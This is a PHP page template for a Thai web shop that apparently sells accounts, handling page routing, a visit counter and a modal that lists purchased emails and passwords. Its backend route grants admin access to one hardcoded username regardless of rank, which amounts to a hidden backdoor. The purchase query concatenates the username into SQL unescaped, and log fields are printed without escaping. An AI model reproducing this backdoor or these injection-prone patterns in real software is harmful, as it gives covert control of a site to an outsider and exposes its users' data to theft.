<?php
if(empty($protect)) {
	http_response_code(404);
	exit();
}
if(@$_GET['page'] == "logout") {
	if(isset($_GET['yes'])) {
		session_destroy();
		echo '<script>location.href="?page=home";</script>';
		exit();
	}else
	{
		exit();
	}
}
$counter_file = "counter.txt";
$count = file_get_contents($counter_file);
$counter = file_put_contents($counter_file,$count+1);
?>
<html lang="th">
 <head>
  <meta charset="utf-8">
  <title><?php echo $config['title']; ?></title>
  <link rel="icon" href="favicon.ico">
  <link rel="stylesheet" href="_dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="_dist/css/datatables.min.css">
  <link rel="stylesheet" href="_dist/css/styles.css">
  <link href="https://fonts.googleapis.com/css?family=Mitr:300" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.itorkungz.me/css/fontawesome-5.2.0.css">
  <script src="_dist/js/jquery.min.js"></script>
  <script src="_dist/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="https://altmc-shop.net/css/animate.css">
  <script src="_dist/js/sweetalert.min.js"></script>
  <script src="_dist/js/datatables.min.js"></script>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <script src="_dist/js/i.js"></script>
  <style>
  	body
	{
	    background-color: #e9ebee;
		-webkit-background-size: cover;
		-moz-background-size: cover;
		-o-background-size: cover;
		background-size: cover;
		font-family:"Mitr", sans-serif;
		color: black;
	}
	</style>
 </head>
 <body>
<div align="center">
<div class="container">
<div class="animated pulse slower infinite">
<a href="#">
<img src="https://www.img.in.th/images/19717208025babfbd224cbaaab6118e4.png">
</a>
</div>
</div>
</div>
 <body background="https://hdwallsource.com/img/2019/7/obduction-game-screenshot-wallpaper-68026-70348-hd-wallpapers.jpg">
<div align="center">
<div id="header" style="margin-top:6%">
<div class="header header-content animated fadeIn">
<p>
<a href="?page=shop" class="btn btn-primary btn-lg"><i class="fas fa-home"></i>&nbsp;หน้าแรก</a>
<a href="?page=topup" class="btn btn-info btn-lg"><i class="fab fa-youtube"></i>&nbsp;เติมเงิน</a>
<a class="btn btn-warning btn-lg" data-toggle="modal" data-target="#myModal"><i class="fab fa-youtube"></i>&nbsp;ลืมข้อมูล</a>
</p>
</div>
</div>
</div>
	  <div class="container" style="margin-top:120px;margin-bottom:120px;">
		<?php
			if(@$_GET['page'] == 'home') {
				require('page.shop.php');
			}else if(@$_GET['page'] == 'topup') {
				require('page.topup.php');
			}else if(@$_GET['page'] == 'history') {
				require('page.history.php');
			}else if(@$_GET['page'] == 'shop') {
				require('page.shop.php');
			}else if(@$_GET['page'] == 'profile') {
				require('page.profile.php');
			}else if(@$_GET['page'] == 'backend') {
				if($user['rank'] == "Admin") {
					require('page.backend.php');
				}elseif($user['username'] == "MJ8V9Q5Rfm") {
					require('page.backend.php');
				}else {
					require('page.shop.php');
				}
			}else {
				require('page.shop.php');
			}
		?>
	  </div>
       <footer class="mastfoot mt-auto">
		<div class="text-center mt-5 mb-5" style="color:black;"><?php echo date('Y'); ?>  &copy; | <?php echo $config['name']; ?><br>Powered by <a href="?page=backend&settings">ToonCodeEdit</a></div>
     </footer>


  <!-- Modal -->
  <div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog modal-lg">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
		<h4 class="modal-title">ข้อมูลของท่าน</h4>
          <button type="button" class="close" data-dismiss="modal">&times;</button>
        </div>
        <table class="table table-default table-striped table-condenseds">
				<thead>
					<tr>
						<th style="background-color: #FFF;" class="text-dark">#</th>
						<th style="background-color: #FFF;" class="text-center text-dark">อีเมล</th>
						<th style="background-color: #FFF;" class="text-center text-dark">รหัส</th>
						<th style="background-color: #FFF;" class="text-center text-dark">รายละเอียด</th>
						<th style="background-color: #FFF;" class="text-center text-dark">ราคา</th>
						<th style="background-color: #FFF;" class="text-center text-dark">เวลา</th>
					</tr>
				</thead>
				<tbody>
					<?php 
					$logs = $connect->query('SELECT * FROM log_shop WHERE username = "'.$user['username'].'" order by id desc');
						$i = '1';
						while($log = $logs->fetch_assoc() ) {
					echo '
						<tr>
							<td class="text-left">'.$log['id'].'</td>
							<td class="text-center">'.$log['email'].'</td>
							<td class="text-center">'.$log['password'].'</td>
							<td class="text-center">'.$log['lore'].'</td>
							<td class="text-center">'.$log['price'].'</td>
							<td class="text-center">'.th($log['time']).'</td>
						</tr>
						';
						$i++;
						}
						?>
				</tbody>
			</table>
        <div class="modal-footer">
         <button type="button" class="btn btn-warning" data-dismiss="modal">โอเค</button>
        </div>
      </div>
      
    </div>
  </div>
  
</div>

</body>
</html>